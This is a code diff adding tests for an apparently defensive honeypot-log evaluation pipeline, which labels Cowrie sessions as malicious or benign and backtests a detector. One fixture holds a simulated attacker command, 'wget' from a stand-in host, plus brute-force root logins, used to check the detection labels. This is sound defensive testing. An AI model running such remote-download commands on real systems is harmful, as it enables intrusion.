@@ -207,3 +207,39 @@ def test_calibration_picks_a_threshold_on_later_labeled_data(tmp_path):
     assert precise["calibration"]["chosen"]["precision"] == 1.0
     with pytest.raises(ValueError, match="objective"):
         ml.calibrate(tmp_path / "base", tmp_path / "cal", tmp_path / "q", validate_config({}), None, "accuracy")
+
+
+# --- Real-data evaluation pipeline ------------------------------------------------------------------
+
+def test_criteria_labels_follow_the_documented_rules():
+    from aegis.canonical import normalize
+    from aegis.realdata import criteria_label
+    s = lambda *records: [normalize(r, "imported") for r in records]
+    assert criteria_label(s(*INTRUSION))[0] == "malicious"
+    assert criteria_label(s(*SCAN)) == ("benign", [], "no interaction")
+    assert criteria_label(s(raw(0, "q"), raw(1, "q", eventid="cowrie.login.success", username="pi")))[0] is None  # login only: excluded
+    brute = [raw(n, "b", eventid="cowrie.login.failed", username="root") for n in range(5)]
+    assert criteria_label(s(*brute)) == ("malicious", ["credential_access"], "meets a malicious criterion")
+    fetch = INTRUSION + [raw(3, "in", eventid="cowrie.command.input", input="wget http://x.example/a")]
+    assert criteria_label(s(*fetch))[1] == ["discovery", "intrusion_sequence", "transfer"]
+
+
+def test_realdata_pipeline_end_to_end(tmp_path):
+    pytest.importorskip("sklearn")
+    from aegis import realdata
+    records, _ = scanner_and_intruders(0, 140, {20, 70, 100, 130}, 5)
+    logs = tmp_path / "logs" / "ip-host"  # the per-host folder aws s3 sync creates
+    logs.mkdir(parents=True)
+    (logs / "cowrie.json.2026-01-01").write_bytes(jsonl(records[: len(records) // 2]))
+    (logs / "cowrie.json").write_bytes(jsonl(records[len(records) // 2:]))
+    (logs / ".gitignore").write_text("")
+    assert [f.name for f in realdata.read_logs([tmp_path / "logs"])] == ["cowrie.json", "cowrie.json.2026-01-01"]
+    report = realdata.run([tmp_path / "logs"], tmp_path / "out", validate_config({}), notes=["Fixture data."])
+    assert report["data"]["sessions"] == 140 and report["labels"]["counts"]["malicious"] == 4
+    assert sum(f["test_sessions"] for f in report["backtest"]["folds"]) == 80  # every session after the first 60
+    assert report["backtest"]["ml"]["ci95"]["recall"] is not None
+    assert report["limitations"][0] == "Fixture data." and (tmp_path / "out" / "report.md").read_text().startswith("# Aegis real-data evaluation")
+    store_labels = sqlite3.connect(tmp_path / "out" / "work" / "evaluation.sqlite3").execute("SELECT DISTINCT actor FROM session_labels").fetchall()
+    assert store_labels == [("criteria-v1 (automated)",)]  # never presented as human labels
+    with pytest.raises(FileExistsError):
+        realdata.run([tmp_path / "logs"], tmp_path / "out", validate_config({}))
